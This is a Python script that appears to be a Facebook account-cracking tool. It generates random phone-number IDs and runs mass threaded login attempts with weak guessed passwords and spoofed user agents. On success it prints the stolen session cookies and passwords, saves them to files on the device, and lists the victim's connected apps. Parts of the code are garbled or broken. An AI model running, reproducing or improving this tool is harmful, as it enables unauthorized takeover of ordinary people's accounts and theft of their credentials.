#__________TDH CYBER SOBUJ
import os
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
#__________TDH CYBER SOBUJ
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#__________TDH CYBER SOBUJ
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
#__________TDH CYBER SOBUJ
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/itz.ongkon.mallik', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text                      
#__________TDH CYBER SOBUJ
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
#__________TDH CYBER SOBUJ         
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' 
m = '\x1b[1;91m' 
k = '\033[93m' 
xr = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://t.me/+tloW2NwRIn5kYjdl')
import os
os.system("pkg install espeak")
#__________TDH CYBER SOBUJ
print("walcome to SEE MORE TDH CYBER SOBUJ")
logo = ("""
\033[38;5;46m ███████╗ ██████╗ ██████╗ ██╗   ██╗     ██╗
\033[38;5;46m ██╔════╝██╔═══██╗██╔══██╗██║   ██║     ██║
\033[38;5;46m ███████╗██║   ██║██████╔╝██║   ██║     ██║
\033[38;5;46m ╚════██║██║   ██║██╔══██╗██║   ██║██   ██║
\033[38;5;46m ███████║╚██████╔╝██████╔╝╚██████╔╝╚█████╔╝
\033[38;5;46m ╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝  ╚════╝ """)
def linex():
	print('\033[38;5;46m══════════════════════════════════')
loop = 0
oks = []
cps = []
#__________TDH CYBER SOBUJ
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM" 
#__________TDH CYBER SOBUJ    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#__________TDH CYBER SOBUJ
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
#__________TDH CYBER SOBUJ
ugen2=[]
ugen=[]
 #__________TDH CYBER SOBUJ
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)  
#__________TDH CYBER SOBUJ
def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :SOBUJ  = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :SOBUJ  = '√ 2009'
        elif uid[:8] in ['10000000']        :SOBUJ  = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:SOBUJ  = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:SOBUJ  = ' 2010'
        elif uid[:6] in ['100001']          :SOBUJ  = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :SOBUJ  = '√ 2011/2012'
        elif uid[:6] in ['100004']          :SOBUJ  = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :SOBUJ  = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :SOBUJ  = '√ 2014/2015'
        elif uid[:6] in ['100009']          :SOBUJ  = '√ 2015'
        elif uid[:5] in ['10001']           :SOBUJ  = '√ 2015/2016'
        elif uid[:5] in ['10002']           :SOBUJ  = '√ 2016/2017'
        elif uid[:5] in ['10003']           :SOBUJ  = '√ 2018/2019'
        elif uid[:5] in ['10004']           :SOBUJ  = '√ 2019/2020'
        elif uid[:5] in ['10005']           :SOBUJ  = '√ 2020'
        elif uid[:5] in ['10006','10007','']:SOBUJ  = '√ 2021'
        elif uid[:5] in ['10008']           :SOBUJ  = '√ 2022'
        elif uid[:5] in ['10009']           :SOBUJ  = '√ 2023'
        else:SOBUJ =''
    elif len(uid) in [9,10]:
        SOBUJ  = ' √ 2008/2009'
    elif len(uid)==8:
        SOBUJ  = '√ 2007/2008'
    elif len(uid)==7:
        SOBUJ  = '√ 2006/2007'
    else:SOBUJ =''
    return SOBUJ 
#__________TDH CYBER SOBUJ
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[38;5;46m══════════════════════════════════')
    print(f'\033[38;5;46m𝗦𝗜𝗠𝗘 𝗖𝗢𝗗𝗘✏️〱{xr}𝟬𝟭𝟵〱𝟬𝟭𝟳〱𝟬𝟭𝟴〱{x}')
    print('\033[38;5;46m══════════════════════════════════')
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    code = random.choice([rk1,rk2,rk3])
    print('\033[38;5;46m══════════════════════════════════')                
    pww = input(f'\033[38;5;46m〱𝗖𝗛𝗢𝗢𝗦𝗘〱✏️')
    print('\033[38;5;46m══════════════════════════════════')
    os.system('clear')
    print(logo)
    print('\033[38;5;46m══════════════════════════════════')
    limit = int(input(f' \033[38;5;46m𝗟𝗜𝗠𝗜𝗧✏️〱𝟮𝟬𝟬𝟬〱𝟯𝟬𝟬0〱𝟱𝟬𝟬𝟬 〱\n '))
    print('\033[38;5;46m══════════════════════════════════')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    SOBUJ  = []
    print("")
    for bilal in range(passx):
        pww = input(f"\033[1;91m[\033[1;97m✅\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
        SOBUJ .append(pww)
    with ThreadPool(max_workers=70) as manshera:
        clear()
        tl = str(len(user))
        print('\033[38;5;46m══════════════════════════════════')
        print('\033[38;5;46m𝗧𝗗𝗛 𝗖𝗬𝗕𝗘𝗥 𝗦𝗢𝗕𝗨𝗝')
        print('\033[38;5;46m══════════════════════════════════')
        print(f' \033[1;91m[\033[1;97m✅\033[1;91m]\033[38;5;46m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙄𝘿:\033[38;5;46m {xr}'+tl)
        print('\033[38;5;46m══════════════════════════════════')              
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in SOBUJ :
                pwx.append(Sobuj)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} \033[38;5;46m══════════════════════════════════")
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
#____((𝑼𝑷𝑫𝑨𝑻𝑬-𝑺𝒀𝑺𝑻𝑬𝑴-𝗦𝗢𝗕𝗨𝗝 𝗧𝗗𝗛))            
            header_freefb = {'authority': 'p.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Infinix X688B"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
#______𝑶𝑲-𝑰𝑵-𝑭𝑹𝑶👇👇👇👇                
                print(f"""❴\033[38;5;46m𝙊𝙆 𝙄𝘿_❵]
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝗧𝗗𝗛 𝗦𝗢𝗕𝗨𝗝\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[33;1m𝘾𝙊𝙊𝙆𝙀𝙎❴\033[38;5;46m𝙇𝙄𝙏𝙀+𝙇𝙊𝙂𝙄𝙉❵\033[37;1m : {coki}
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝗧𝗗𝗛 𝗦𝗢𝗕𝗨𝗝\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m  𝗧𝗗𝗛 𝗦𝗢𝗕𝗨𝗝 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m   𝗧𝗗𝗛 𝗦𝗢𝗕𝗨𝗝 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/𝗦𝗢𝗕𝗨𝗝-𝗖𝗬𝗕𝗘𝗥-𝗧𝗗𝗛-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
#______𝑪𝑷-𝑰𝑵-𝑭𝑹𝑶👇👇👇👇 
                print(f"""❴\033[38;5;46m𝑪𝑷 𝙄𝘿_❵]
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     𝗧𝗗𝗛 𝗦𝗢𝗕𝗨𝗝 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     𝗧𝗗𝗛 𝗦𝗢𝗕𝗨𝗝 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open('/sdcard/\033[38;5;46m𝗧𝗗𝗛-𝗦𝗢𝗕𝗨𝗝-𝗖𝗬𝗕𝗘𝗥-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
#______𝑬𝑴𝑶𝑱𝑰-𝑪𝑹𝑲-𝑺𝒀𝑺𝑻𝑬𝑴👇👇👇👇 
        brand=random.choice(['SOBUJ  CYBER','SOBUJ -CYBER ','SOBUJ  CRACK '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','??','🌺','🌸','🏵️','🍁','🌼','??','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟𝕋𝔻ℍ✮⃝𝕊𝕆𝔹𝕌𝕁𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46m𝗦𝗢𝗕𝗨𝗝-𝗖𝗬𝗕𝗘𝗥💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()